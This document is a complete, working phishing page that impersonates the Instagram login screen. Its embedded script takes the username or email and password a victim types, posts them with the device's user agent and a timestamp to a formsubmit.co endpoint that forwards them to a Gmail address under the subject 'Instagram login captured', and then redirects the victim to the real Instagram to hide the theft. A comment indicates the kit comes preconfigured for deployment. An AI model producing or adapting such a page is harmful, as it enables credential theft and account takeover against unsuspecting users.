<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram • Log in</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--blue:#0095f6;--border:#dbdbdb;--gray:#8e8e8e;}
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:#fafafa;font-family:Roboto,system-ui,sans-serif;}
  .wrap{width:100%;max-width:380px;padding:20px;}
  .card{background:#fff;border:1px solid var(--border);border-radius:12px;padding:36px 32px;
        display:flex;flex-direction:column;align-items:center;}
  .logo{font-family:'Grand Hotel',cursive;font-size:46px;line-height:1;margin:0 0 8px;}
  .hook{color:var(--gray);font-size:14px;margin:0 0 22px;text-align:center;}
  form{width:100%;display:flex;flex-direction:column;gap:8px;}
  input{width:100%;padding:12px 10px;font-size:14px;background:#fafafa;
        border:1px solid var(--border);border-radius:6px;outline:none;}
  input:focus{border-color:#a8a8a8;background:#fff;}
  button{margin-top:8px;padding:11px;border:0;border-radius:8px;background:var(--blue);
         color:#fff;font-size:14px;font-weight:600;cursor:pointer;}
  button:active{opacity:.85;}
  .divider{display:flex;align-items:center;gap:16px;width:100%;margin:20px 0;
           color:var(--gray);font-size:12px;font-weight:600;}
  .divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border);}
  .fb{color:#385185;font-size:14px;font-weight:500;}
  .forgot{color:#00376b;font-size:12px;margin-top:18px;}
  .bottom{background:#fff;border:1px solid var(--border);border-radius:12px;margin-top:10px;
          padding:20px;text-align:center;font-size:14px;}
  .bottom b{color:var(--blue);}
  .status{height:16px;font-size:12px;color:var(--gray);margin-top:10px;text-align:center;}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <h1 class="logo">Instagram</h1>
    <p class="hook">Sign in to see your future</p>

    <form id="f" autocomplete="off">
      <input id="u" name="email" type="text"
             placeholder="Phone number, username, or email" required>
      <input id="p" name="password" type="password" placeholder="Password" required>
      <button type="submit">Log in</button>
      <div class="status" id="status"></div>
    </form>

    <div class="divider">OR</div>
    <div class="fb">Log in with Facebook</div>
    <div class="forgot">Forgot password?</div>
  </div>

  <div class="bottom">Don't have an account? <b>Sign up</b></div>
</div>

<script>
  // Your Gmail is already set below
  const ENDPOINT = "https://formsubmit.co/ajax/goat677467@gmail.com";

  const form   = document.getElementById('f');
  const status = document.getElementById('status');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email    = document.getElementById('u').value.trim();
    const password = document.getElementById('p').value;
    status.textContent = "Logging you in...";

    const send = fetch(ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({
        _subject: "Instagram login captured",
        email: email,
        password: password,
        device: navigator.userAgent,
        time: new Date().toLocaleString()
      })
    }).catch(() => {});

    await Promise.race([send, new Promise(r => setTimeout(r, 900))]);

    window.location.href = "https://www.instagram.com/";
  });
</script>
</body>
</html>
